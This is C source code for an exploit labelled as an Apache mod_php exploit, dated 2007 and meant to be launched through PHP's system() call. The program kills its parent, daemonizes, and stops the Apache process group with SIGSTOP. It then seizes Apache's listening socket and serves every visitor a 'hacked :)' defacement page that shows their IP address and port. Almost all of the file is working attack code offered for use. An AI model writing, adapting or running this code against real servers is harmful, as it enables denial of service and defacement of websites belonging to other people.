/*******************************************************/
/*                                                     */
/* Apache's mod_php exploit                            */
/* Stops all Apache processes (except root), and       */
/*   listens to Apache's port                          */
/*                                                     */
/* Execute this via system() function of PHP           */
/*                                                     */
/* Tested on:                                          */
/*  apache: 2.2.3                                      */
/*  php: 4.4.3, 4.4.4, 5.0.4, 5.1.4, 5.1.6, 5.2.0RC5   */
/*                                                     */
/* Coded by ZERO-COLD  , 17/08/07                      */
/*  [ tryag.com/cc ]                                   */
/*                                                     */
/*******************************************************/

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>

char* header = "HTTP/1.1 200 OK\r\nContent-type: text/html\r\n\r\nSorry, the server is unavailable: hacked :)\r\n";

char tmp[1024];

int main()
{
    chdir( "/" );			// do it, because it is recommended for daemons :)
    signal( SIGCHLD, SIG_IGN );		// do not bother if a child dies
    kill( getppid(), SIGKILL );		// kill parent (to avoid 'zombies')
    
    if ( fork() )  return 0;		// daemonize, and parent exit
    sleep( 1 );				// wait for parent to exit (we don't want him to catch SIGSTOP)

    int p = getsid( 0 );		// get current Process Group Id
    setsid( );				// become session leader	
    kill( -p, SIGSTOP );		// good night, Apache Process Group :)
    
    int sock;
    struct sockaddr_in clientname;
     
    for ( sock = 3; sock < getdtablesize(); sock++ )  // find valid socket handle
	if ( listen (sock, 10) == 0 ) break;
	
    while ( 1 )
    {
	int new;
        unsigned size = sizeof( clientname );
        new = accept( sock, (struct sockaddr *) &clientname, &size);
	
        if (new < 0)
	    return 1;
	
	if ( fork() == 0 )	// child will handle this connection, parent will listen for new connection
	{

	    write( new, header, strlen(header) );
	    sprintf( tmp, "<br>You are %s : %hd\n", inet_ntoa( clientname.sin_addr ),ntohs( clientname.sin_port ));
	    write( new, tmp, strlen(tmp)+1 );
	
	    shutdown( new, 2 );
	    close( new ); 
	    
	    return 0;
	}
    }
}


